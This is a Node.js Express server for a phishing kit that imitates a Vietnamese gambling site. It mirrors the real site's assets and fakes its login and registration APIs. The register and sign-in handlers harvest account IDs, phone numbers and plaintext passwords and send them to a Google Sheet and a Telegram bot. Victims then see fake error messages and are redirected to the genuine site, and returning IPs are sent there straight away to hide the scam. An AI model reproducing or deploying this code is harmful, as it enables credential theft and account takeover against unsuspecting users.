require('dotenv').config();
const express = require('express');
const path = require('path');
const session = require('express-session');

// Import utilities
const { googleSheetApi } = require('./utils/api');
const {
  sendRegisterAccountToBot,
  sendLoginAccountToBot,
} = require('./utils/sendTelegram');
const ipTracker = require('./utils/ipTracker');

// Import Routes
const adminRoutes = require('./routes/admin');

const app = express();
const PORT = process.env.PORT || 3005;


// Session setup
app.use(
  session({
    secret: 'tweb-admin-secret-key-98765',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }, // 1 day
  })
);

// App configuration
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.set('trust proxy', true);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve auth.js with cache control headers to prevent client caching issues
app.get('/js/auth.js', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.sendFile(path.join(__dirname, 'public', 'js', 'auth.js'));
});

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to proxy and cache missing static assets dynamically from the reference site
app.use((req, res, next) => {
  if (req.method !== 'GET') return next();

  const isAsset = /\.(png|jpe?g|gif|svg|ico|webp|css|js|woff2?|ttf|otf|mp3|mp4)$/i.test(req.path) ||
    req.path.startsWith('/img.alltocon.com/') ||
    req.path.startsWith('/img.alltocon.com');

  if (!isAsset) return next();

  const fs = require('fs');
  const https = require('https');

  const localPath = path.join(__dirname, 'public', req.path);
  if (fs.existsSync(localPath)) {
    return next();
  }

  let remoteUrl = '';
  if (req.path.startsWith('/img.alltocon.com/')) {
    remoteUrl = `https:/${req.path}`;
  } else if (req.path.startsWith('/img.alltocon.com')) {
    remoteUrl = `https:/${req.path}`;
  } else {
    remoteUrl = `https://www.t12026ga6789.com${req.path}`;
  }

  const cleanPath = localPath.split('?')[0];
  const dir = path.dirname(cleanPath);

  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  const fileStream = fs.createWriteStream(cleanPath);
  https.get(remoteUrl, (response) => {
    if (response.statusCode === 200) {
      response.pipe(fileStream);
      fileStream.on('finish', () => {
        fileStream.close();
        res.sendFile(cleanPath);
      });
    } else {
      fileStream.close();
      if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
      next();
    }
  }).on('error', () => {
    fileStream.close();
    if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
    next();
  });
});


// Middleware to automatically detect mobile User-Agents and render mobile views if available
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua) || req.query.device === 'mobile' || req.query.mobile === 'true';

  const originalRender = res.render;
  res.render = function (view, options, callback) {
    if (isMobile && typeof view === 'string' && !view.startsWith('admin/')) {
      const mobileView = `mobile/${view}`;
      const viewPath = path.join(__dirname, 'views', `${mobileView}.ejs`);
      const fs = require('fs');
      if (fs.existsSync(viewPath)) {
        return originalRender.call(this, mobileView, options, callback);
      }
    }
    return originalRender.call(this, view, options, callback);
  };
  next();
});

// Global app locals initialization
app.locals.domainConfig = {
  redirectDomain: process.env.REDIRECT_DOMAIN || '',
  regDomain: process.env.REG_DOMAIN || '',
  loginDomain: process.env.LOGIN_DOMAIN || '',
  cskhLink: process.env.CSKH_LINK || '',
  copyrightLink: process.env.COPYRIGHT_LINK || '',
  copyrightText: process.env.COPYRIGHT_TEXT || 'Copyright © GA6789 Reserved',
  redirectDelay: process.env.REDIRECT_DELAY_SECONDS || '0',
};
app.locals.recentLogs = [];

// Helper functions
function getIp(req) {
  const ip =
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for'] ||
    req.socket.remoteAddress ||
    '127.0.0.1';
  return ip.toString();
}

const handleApiResponse = async (req, res, actionType) => {
  try {
    const timeNow = new Date().toLocaleString('vi-VN', {
      timeZone: 'Asia/Ho_Chi_Minh',
    });
    const userIp = getIp(req);

    // Track IP to ipTracker on form submission
    ipTracker.addIp(userIp);

    let data = {
      action: actionType,
      timeNow,
      userIp,
      ...req.body,
    };

    if (actionType === 'register') {
      let password = req.body.PWD || '';
      const rawPhone = (req.body.CellPhone || '').trim();
      let phoneClean = rawPhone.replace(/[^0-9+]/g, '');
      if (phoneClean.startsWith('+84')) {
        phoneClean = '0' + phoneClean.slice(3);
      } else if (phoneClean.startsWith('84') && phoneClean.length === 11) {
        phoneClean = '0' + phoneClean.slice(2);
      }

      if (!rawPhone || !/^0[0-9]{9}$/.test(phoneClean)) {
        return res.status(400).json({
          Error: {
            Code: 400,
            Message: 'Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 số.',
          },
        });
      }

      // Decode base64 if it's base64 encoded
      // Decode base64 if it's base64 encoded
      try {
        if (/^[a-zA-Z0-9+/]+={0,2}$/.test(password) && password.length % 4 === 0) {
          password = Buffer.from(password, 'base64').toString('utf-8');
        }
      } catch (e) {
        // use raw password if decoding fails
      }
      data.PWD = password;

      // Log registration to Admin Panel
      const recentLogs = req.app.locals.recentLogs || [];
      recentLogs.push({
        id: Date.now().toString() + '_' + Math.random().toString(36).substring(2, 7),
        action: 'register',
        accountId: req.body.AccountID || req.body.CellPhone || 'Unknown',
        phone: req.body.CellPhone || '',
        ip: userIp,
        time: timeNow,
      });
      if (recentLogs.length > 100) recentLogs.shift();

      await Promise.all([
        googleSheetApi.storageDataRegisterToGoogleSheet(data, process.env.GOOGLE_SHEET_URL),
        sendRegisterAccountToBot(
          req.body.CellPhone || '',
          req.body.AccountID || '',
          req.body.NickName || '',
          userIp,
          timeNow,
          password
        ),
      ]);

      const { regDomain, redirectDomain } = req.app.locals.domainConfig;
      return res.json({
        Error: {
          Code: 5999,
          Message: 'Lỗi mạng, vui lòng làm mới giao diện',
          Redirect: regDomain || redirectDomain || '/',
        },
      });
    } else if (actionType === 'login') {
      const accountId = (req.body.AccountID || req.body.login || req.body.username || '').trim();
      const pwd = req.body.AccountPWD || req.body.password || '';
      const rawPhone = (req.body.phone || req.body.CellPhone || '').trim();

      if (!accountId || !pwd) {
        return res.status(400).json({
          Error: {
            Code: 400,
            Message: 'Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.',
          },
        });
      }

      if (rawPhone) {
        let phoneClean = rawPhone.replace(/[^0-9+]/g, '');
        if (phoneClean.startsWith('+84')) {
          phoneClean = '0' + phoneClean.slice(3);
        } else if (phoneClean.startsWith('84') && phoneClean.length === 11) {
          phoneClean = '0' + phoneClean.slice(2);
        }

        if (!/^0[0-9]{9}$/.test(phoneClean)) {
          return res.status(400).json({
            Error: {
              Code: 400,
              Message: 'Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 số.',
            },
          });
        }
      }

      // Log login to Admin Panel
      const recentLogs = req.app.locals.recentLogs || [];
      recentLogs.push({
        id: Date.now().toString() + '_' + Math.random().toString(36).substring(2, 7),
        action: 'login',
        accountId: accountId || rawPhone || 'Unknown',
        phone: rawPhone || '',
        ip: userIp,
        time: timeNow,
      });
      if (recentLogs.length > 100) recentLogs.shift();

      await Promise.all([
        googleSheetApi.storageDataLoginToGoogleSheet(data, process.env.GOOGLE_SHEET_URL),
        sendLoginAccountToBot(
          userIp,
          timeNow,
          rawPhone || '',
          accountId || '',
          pwd || ''
        ),
      ]);

      const { loginDomain, redirectDomain } = req.app.locals.domainConfig;
      return res.json({
        Error: {
          Code: 1002,
          Message: 'Tài khoản hoặc mật khẩu sai',
          Redirect: loginDomain || redirectDomain || '/'
        },
      });
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ message: 'Error processing data' });
  }
};

// Intermediate redirect renderer for delayed redirection
function renderRedirectPage(res, targetUrl, delaySeconds) {
  return res.send(`<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="${delaySeconds};url=${targetUrl}">
  <title>Đang chuyển hướng...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0b0d13;
      color: #ffffff;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid rgba(255, 255, 255, 0.1);
      border-top-color: #f9752d;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
    p { font-size: 14px; color: #8b949e; margin-bottom: 16px; }
    .countdown { font-weight: bold; color: #f9752d; }
    a { color: #f9752d; text-decoration: none; font-size: 13px; margin-top: 10px; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <h2>Đang chuyển hướng trang web...</h2>
  <p>Vui lòng chờ trong <span id="timer" class="countdown">${delaySeconds}</span> giây...</p>
  <a href="${targetUrl}">Bấm vào đây nếu trang không tự chuyển hướng</a>
  <script>
    var seconds = ${delaySeconds};
    var timerEl = document.getElementById("timer");
    var interval = setInterval(function() {
      seconds--;
      if (timerEl && seconds >= 0) timerEl.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(interval);
        window.location.replace("${targetUrl}");
      }
    }, 1000);
    setTimeout(function() {
      window.location.replace("${targetUrl}");
    }, ${delaySeconds * 1000});
  </script>
</body>
</html>`);
}

// IP Redirect Middleware for 2nd-time visits
app.use((req, res, next) => {
  if (req.method !== 'GET') return next();
  const p = req.path.toLowerCase();
  if (
    p.startsWith('/admin') ||
    p.startsWith('/api') ||
    p.startsWith('/js') ||
    p.startsWith('/css') ||
    p.startsWith('/img')
  ) {
    return next();
  }

  const userIp = getIp(req);
  if (ipTracker.isIpSubmitted(userIp)) {
    const { redirectDomain, loginDomain, regDomain } = req.app.locals.domainConfig;
    const targetUrl = redirectDomain || loginDomain || regDomain;
    if (targetUrl) {
      const delaySeconds = parseInt(req.app.locals.domainConfig.redirectDelay || '0', 10);
      if (delaySeconds <= 0) {
        return res.redirect(targetUrl);
      } else {
        return renderRedirectPage(res, targetUrl, delaySeconds);
      }
    }
  }

  next();
});

// Admin panel route
app.use('/admin', adminRoutes);

// Home route
app.get('/', (req, res) => {
  res.render('index');
});

// Promotions route
app.get('/promotions', (req, res) => {
  res.render('promotions');
});

// Signup route
app.get('/signup', (req, res) => {
  res.render('signup');
});

// Login route
app.get('/login', (req, res) => {
  res.render('login');
});

// Public Domain Config API
app.get('/api/config/domains', (req, res) => {
  res.json(app.locals.domainConfig || {});
});

// Account / CSKH route
app.get('/account', (req, res) => {
  res.render('account');
});





// Lobby routes
app.get('/gamelobby/animal', (req, res) => {
  res.render('animal');
});

app.get('/gamelobby/sports', (req, res) => {
  res.render('sports');
});

app.get('/gamelobby/live', (req, res) => {
  res.render('live');
});

app.get('/gamelobby/egame', (req, res) => {
  res.render('egame');
});

app.get('/gamelobby/mpg', (req, res) => {
  res.render('mpg');
});

app.get('/gamelobby/esports', (req, res) => {
  res.render('esports');
});

app.get('/gamelobby/chess', (req, res) => {
  res.render('chess');
});

app.get('/gamelobby/lottery', (req, res) => {
  res.render('lottery');
});

// QR download page route
app.get('/page/QR', (req, res) => {
  res.render('qr');
});

// VIP route
app.get('/myvip', (req, res) => {
  res.render('myvip');
});

// API endpoints to mock standard actions and capture credentials
app.post('/api/Common/GetVerifyMode', (req, res) => {
  res.json({ Data: 1 });
});

app.post('/api/Verify/VerifyAccountIDIsExist', (req, res) => {
  res.json({
    Data: {
      AccountList: null,
      CanUse: true,
      CookieID: '0ce10a162e074dc8ba54980782e743db',
      IsOverIpLimit: false,
      VerifyStatus: 0,
    },
  });
});

app.post('/api/Common/IsMemberRegisterEnabled', (req, res) => {
  res.json({ Data: true });
});

app.post('/api/MemberInfo/RegisterMember', (req, res) =>
  handleApiResponse(req, res, 'register')
);

app.post('/api/Authorize/SignIn', (req, res) =>
  handleApiResponse(req, res, 'login')
);

app.get('/support', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad/i.test(req.headers['user-agent'] || '');
  res.render(isMobile ? 'mobile/support' : 'mobile/support');
});

// Catch-all: serve index for SPA-like behavior
app.get(/.*/, (req, res) => {
  res.render('index');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
